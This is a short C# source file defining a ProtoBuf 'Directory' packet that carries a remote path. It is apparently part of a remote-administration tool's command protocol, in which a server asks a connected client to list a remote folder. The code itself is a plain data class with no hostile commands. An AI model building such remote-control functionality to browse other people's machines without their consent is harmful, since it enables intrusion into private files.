using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Directory : IPacket
    {
        public Directory()
        {
        }

        public Directory(string remotepath)
        {
            RemotePath = remotepath;
        }

        [ProtoMember(1)]
        public string RemotePath { get; set; }

        public void Execute(Client client)
        {
            client.Send<Directory>(this);
        }
    }
}